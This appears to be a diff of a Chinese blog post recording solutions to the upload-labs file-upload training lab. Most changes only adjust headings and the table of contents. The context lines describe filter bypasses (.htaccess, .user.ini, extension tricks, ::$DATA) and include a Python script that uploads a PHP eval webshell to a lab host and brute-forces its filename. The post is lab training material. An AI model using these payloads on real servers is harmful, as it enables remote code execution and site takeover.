@@ -16,7 +16,7 @@
 <meta property="og:description" content="upload-labs刷题记录">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-02-01T14:42:04.000Z">
-<meta property="article:modified_time" content="2020-02-09T11:46:57.563Z">
+<meta property="article:modified_time" content="2020-02-09T11:53:37.435Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -157,31 +157,31 @@
       
         <p>upload-labs刷题记录</p>
 <a id="more"></a>
-<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>更改httpd.conf </p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>更改httpd.conf </p>
 <ul>
 <li>AllowOverride None 替换为AllowOverride All</li>
 <li>#Addtype application/x-httpd-php .php .php3 这一行取消注释并添加.php5和.phtml</li>
 </ul>
-<h1 id="Less-01-JS检查后缀"><a href="#Less-01-JS检查后缀" class="headerlink" title="Less-01 JS检查后缀"></a>Less-01 JS检查后缀</h1><ol>
+<h2 id="Less-01-JS检查后缀"><a href="#Less-01-JS检查后缀" class="headerlink" title="Less-01 JS检查后缀"></a>Less-01 JS检查后缀</h2><ol>
 <li>上传1.php，显示该文件不允许上传</li>
 <li>抓包尝试改后缀但没有包就提示了禁止上传,怀疑是js控制后缀检查</li>
 <li>禁用js，重复尝试一直显示上传失败，很不科学，最后发现是Windows defender开着防火墙……，可以用免杀马或者关了防火墙，于是关掉防火墙</li>
 <li>上传成功并getshell </li>
 </ol>
-<h1 id="Less-02-Content-Type检测"><a href="#Less-02-Content-Type检测" class="headerlink" title="Less-02 Content-Type检测"></a>Less-02 Content-Type检测</h1><ol>
+<h2 id="Less-02-Content-Type检测"><a href="#Less-02-Content-Type检测" class="headerlink" title="Less-02 Content-Type检测"></a>Less-02 Content-Type检测</h2><ol>
 <li>上传2.php，显示文件类型不正确</li>
 <li>改名2.jpg，抓包改成2.php,上传成功并getshell</li>
 <li>猜测为js检测，禁用js直接传php，但是上传失败</li>
 <li>猜测为后端检测Content-Type: image/jpeg，上传php,抓包改http请求头,上传成功，证明猜测正确</li>
 </ol>
-<h1 id="Less-03-黑名单绕过"><a href="#Less-03-黑名单绕过" class="headerlink" title="Less-03 黑名单绕过"></a>Less-03 黑名单绕过</h1><ol>
+<h2 id="Less-03-黑名单绕过"><a href="#Less-03-黑名单绕过" class="headerlink" title="Less-03 黑名单绕过"></a>Less-03 黑名单绕过</h2><ol>
 <li>直接传图片，可以</li>
 <li>禁用js传php,失败</li>
 <li>上传php3，发现可以上传但利用时间重命名了，格式为年月日时分秒+rand(1000,9999)，在回显的源码里有文件名，下面是我自己写的爆破文件名的脚本</li>
 <li>连接.php3文件getshell</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">爆破文件名脚本</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">burp0_url &#x3D; &quot;http:&#x2F;&#x2F;sec.com:80&#x2F;upload-labs&#x2F;Pass-03&#x2F;index.php&quot;</span><br><span class="line">burp0_headers &#x3D; &#123;&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0&quot;, &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;multipart&#x2F;form-data; boundary&#x3D;---------------------------21329670478326395581169607454&quot;, &quot;Origin&quot;: &quot;http:&#x2F;&#x2F;sec.com&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http:&#x2F;&#x2F;sec.com&#x2F;upload-labs&#x2F;Pass-03&#x2F;index.php&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;</span><br><span class="line">burp0_data &#x3D; &quot;-----------------------------21329670478326395581169607454\r\nContent-Disposition: form-data; name&#x3D;\&quot;upload_file\&quot;; filename&#x3D;\&quot;3.php \&quot;\r\nContent-Type: text&#x2F;php\r\n\r\n&lt;?php @eval($_POST[\&quot;shell\&quot;]);?&gt;\n\r\n-----------------------------21329670478326395581169607454\r\nContent-Disposition: form-data; name&#x3D;\&quot;submit\&quot;\r\n\r\n\xe4\xb8\x8a\xe4\xbc\xa0\r\n-----------------------------21329670478326395581169607454--\r\n&quot;</span><br><span class="line">session.post(burp0_url, headers&#x3D;burp0_headers, data&#x3D;burp0_data)</span><br><span class="line">s&#x3D;time.strftime(&quot;%Y%m%d%H%M%S&quot;,time.localtime())</span><br><span class="line">for i in range(1000,9999):</span><br><span class="line">    filename&#x3D;s+str(i)+&quot;.php &quot;</span><br><span class="line">    guessurl&#x3D;&quot;http:&#x2F;&#x2F;sec.com&#x2F;upload-labs&#x2F;upload&#x2F;&quot;+filename</span><br><span class="line">    code&#x3D;requests.get(guessurl).status_code</span><br><span class="line">    print(i)</span><br><span class="line">    if code &#x3D;&#x3D; 200: </span><br><span class="line">        print(&quot;The filename is %s&quot;%filename)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
-<h1 id="Less-04-htaccess文件解析"><a href="#Less-04-htaccess文件解析" class="headerlink" title="Less-04 .htaccess文件解析"></a>Less-04 .htaccess文件解析</h1><ol>
+<h2 id="Less-04-htaccess文件解析"><a href="#Less-04-htaccess文件解析" class="headerlink" title="Less-04 .htaccess文件解析"></a>Less-04 .htaccess文件解析</h2><ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
 <li>传php，抓包更改content-type，失败</li>
@@ -190,7 +190,7 @@
 <li>抓包上传.htaccess文件，内容如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;4.php6&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
 <li>成功getshell</li>
 </ol>
-<h1 id="Less-05-user-ini利用"><a href="#Less-05-user-ini利用" class="headerlink" title="Less-05 .user.ini利用"></a>Less-05 .user.ini利用</h1><p>注：需使用php-nts格式</p>
+<h2 id="Less-05-user-ini利用"><a href="#Less-05-user-ini利用" class="headerlink" title="Less-05 .user.ini利用"></a>Less-05 .user.ini利用</h2><p>注：需使用php-nts格式</p>
 <ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
@@ -203,7 +203,7 @@
 <li>查看提示存在upload目录readme.php，想到了SUCTF2019提到的.user.ini利用，于是上传.user.ini，内容为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;5.pass</span><br></pre></td></tr></table></figure></li>
 <li>上传5.pass内容为一句话木马，成功getshell</li>
 </ol>
-<h1 id="Less-06-大小写绕过黑名单"><a href="#Less-06-大小写绕过黑名单" class="headerlink" title="Less-06 大小写绕过黑名单"></a>Less-06 大小写绕过黑名单</h1><ol>
+<h2 id="Less-06-大小写绕过黑名单"><a href="#Less-06-大小写绕过黑名单" class="headerlink" title="Less-06 大小写绕过黑名单"></a>Less-06 大小写绕过黑名单</h2><ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
 <li>传php，抓包更改content-type，失败</li>
@@ -211,7 +211,7 @@
 <li>.htaccess上传失败</li>
 <li>上传6.phP上传成功,查看回显文件名并getshell</li>
 </ol>
-<h1 id="Less-07-空格绕过"><a href="#Less-07-空格绕过" class="headerlink" title="Less-07 空格绕过"></a>Less-07 空格绕过</h1><ol>
+<h2 id="Less-07-空格绕过"><a href="#Less-07-空格绕过" class="headerlink" title="Less-07 空格绕过"></a>Less-07 空格绕过</h2><ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
 <li>传php，抓包更改content-type，失败</li>
@@ -221,7 +221,7 @@
 <li>查看师傅们的wp，发现是没有对文件名进行去空处理</li>
 <li>上传7.php空格 ，成功getshell</li>
 </ol>
-<h1 id="Less-08-文件名加点绕过"><a href="#Less-08-文件名加点绕过" class="headerlink" title="Less-08 文件名加点绕过"></a>Less-08 文件名加点绕过</h1><ol>
+<h2 id="Less-08-文件名加点绕过"><a href="#Less-08-文件名加点绕过" class="headerlink" title="Less-08 文件名加点绕过"></a>Less-08 文件名加点绕过</h2><ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
 <li>传php，抓包更改content-type，失败</li>
@@ -231,7 +231,7 @@
 <li>上传8.php空格 ，上传失败</li>
 <li>上传8.php. ,成功上传并getshell</li>
 </ol>
-<h1 id="Less-09-文件流特性绕过"><a href="#Less-09-文件流特性绕过" class="headerlink" title="Less-09 文件流特性绕过"></a>Less-09 文件流特性绕过</h1><ol>
+<h2 id="Less-09-文件流特性绕过"><a href="#Less-09-文件流特性绕过" class="headerlink" title="Less-09 文件流特性绕过"></a>Less-09 文件流特性绕过</h2><ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
 <li>传php，抓包更改content-type，失败</li>
@@ -242,7 +242,7 @@
 <li>上传9.php.，上传失败</li>
 <li>上传9.php::$DATA，上传成功并getshell</li>
 </ol>
-<h1 id="Less-10-文件名-空格-绕过"><a href="#Less-10-文件名-空格-绕过" class="headerlink" title="Less-10 文件名.空格.绕过"></a>Less-10 文件名.空格.绕过</h1><ol>
+<h2 id="Less-10-文件名-空格-绕过"><a href="#Less-10-文件名-空格-绕过" class="headerlink" title="Less-10 文件名.空格.绕过"></a>Less-10 文件名.空格.绕过</h2><ol>
 <li>上传测试图片成功</li>
 <li>禁用js,传php,提示该类型不允许上传</li>
 <li>传php，抓包更改content-type，失败</li>
@@ -457,7 +457,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境配置"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-01-JS检查后缀"><span class="toc-number">2.</span> <span class="toc-text">Less-01 JS检查后缀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-02-Content-Type检测"><span class="toc-number">3.</span> <span class="toc-text">Less-02 Content-Type检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-03-黑名单绕过"><span class="toc-number">4.</span> <span class="toc-text">Less-03 黑名单绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-04-htaccess文件解析"><span class="toc-number">5.</span> <span class="toc-text">Less-04 .htaccess文件解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-05-user-ini利用"><span class="toc-number">6.</span> <span class="toc-text">Less-05 .user.ini利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-06-大小写绕过黑名单"><span class="toc-number">7.</span> <span class="toc-text">Less-06 大小写绕过黑名单</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-07-空格绕过"><span class="toc-number">8.</span> <span class="toc-text">Less-07 空格绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-08-文件名加点绕过"><span class="toc-number">9.</span> <span class="toc-text">Less-08 文件名加点绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-09-文件流特性绕过"><span class="toc-number">10.</span> <span class="toc-text">Less-09 文件流特性绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-10-文件名-空格-绕过"><span class="toc-number">11.</span> <span class="toc-text">Less-10 文件名.空格.绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11-双写绕过"><span class="toc-number">12.</span> <span class="toc-text">Less-11 双写绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-12-GET-00截断绕过"><span class="toc-number">13.</span> <span class="toc-text">Less-12 GET%00截断绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-13-POST-00截断绕过"><span class="toc-number">14.</span> <span class="toc-text">Less-13 POST%00截断绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-14-读取文件头检测绕过"><span class="toc-number">15.</span> <span class="toc-text">Less-14 读取文件头检测绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-15-getimagesize-绕过"><span class="toc-number">16.</span> <span class="toc-text">Less-15 getimagesize()绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-16-php-exif检测"><span class="toc-number">17.</span> <span class="toc-text">Less-16 php_exif检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-17-二次渲染绕过"><span class="toc-number">18.</span> <span class="toc-text">Less-17 二次渲染绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gif格式图片"><span class="toc-number">18.1.</span> <span class="toc-text">gif格式图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png格式图片"><span class="toc-number">18.2.</span> <span class="toc-text">png格式图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jpg格式图片"><span class="toc-number">18.3.</span> <span class="toc-text">jpg格式图片</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-18-黑名单条件竞争"><span class="toc-number">19.</span> <span class="toc-text">Less-18 黑名单条件竞争</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-19-白名单条件竞争"><span class="toc-number">20.</span> <span class="toc-text">Less-19 白名单条件竞争</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-20-绕过"><span class="toc-number">21.</span> <span class="toc-text">Less-20 &#x2F;.绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-21-数组绕过"><span class="toc-number">22.</span> <span class="toc-text">Less-21 数组绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-number">23.</span> <span class="toc-text">参考文章</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境配置"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-01-JS检查后缀"><span class="toc-number">2.</span> <span class="toc-text">Less-01 JS检查后缀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-02-Content-Type检测"><span class="toc-number">3.</span> <span class="toc-text">Less-02 Content-Type检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-03-黑名单绕过"><span class="toc-number">4.</span> <span class="toc-text">Less-03 黑名单绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-04-htaccess文件解析"><span class="toc-number">5.</span> <span class="toc-text">Less-04 .htaccess文件解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-05-user-ini利用"><span class="toc-number">6.</span> <span class="toc-text">Less-05 .user.ini利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-06-大小写绕过黑名单"><span class="toc-number">7.</span> <span class="toc-text">Less-06 大小写绕过黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-07-空格绕过"><span class="toc-number">8.</span> <span class="toc-text">Less-07 空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-08-文件名加点绕过"><span class="toc-number">9.</span> <span class="toc-text">Less-08 文件名加点绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-09-文件流特性绕过"><span class="toc-number">10.</span> <span class="toc-text">Less-09 文件流特性绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10-文件名-空格-绕过"><span class="toc-number">11.</span> <span class="toc-text">Less-10 文件名.空格.绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11-双写绕过"><span class="toc-number"></span> <span class="toc-text">Less-11 双写绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-12-GET-00截断绕过"><span class="toc-number"></span> <span class="toc-text">Less-12 GET%00截断绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-13-POST-00截断绕过"><span class="toc-number"></span> <span class="toc-text">Less-13 POST%00截断绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-14-读取文件头检测绕过"><span class="toc-number"></span> <span class="toc-text">Less-14 读取文件头检测绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-15-getimagesize-绕过"><span class="toc-number"></span> <span class="toc-text">Less-15 getimagesize()绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-16-php-exif检测"><span class="toc-number"></span> <span class="toc-text">Less-16 php_exif检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-17-二次渲染绕过"><span class="toc-number"></span> <span class="toc-text">Less-17 二次渲染绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gif格式图片"><span class="toc-number">1.</span> <span class="toc-text">gif格式图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png格式图片"><span class="toc-number">2.</span> <span class="toc-text">png格式图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jpg格式图片"><span class="toc-number">3.</span> <span class="toc-text">jpg格式图片</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-18-黑名单条件竞争"><span class="toc-number"></span> <span class="toc-text">Less-18 黑名单条件竞争</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-19-白名单条件竞争"><span class="toc-number"></span> <span class="toc-text">Less-19 白名单条件竞争</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-20-绕过"><span class="toc-number"></span> <span class="toc-text">Less-20 &#x2F;.绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-21-数组绕过"><span class="toc-number"></span> <span class="toc-text">Less-21 数组绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-number"></span> <span class="toc-text">参考文章</span></a>
                     </div>
                 </span>
             </div>
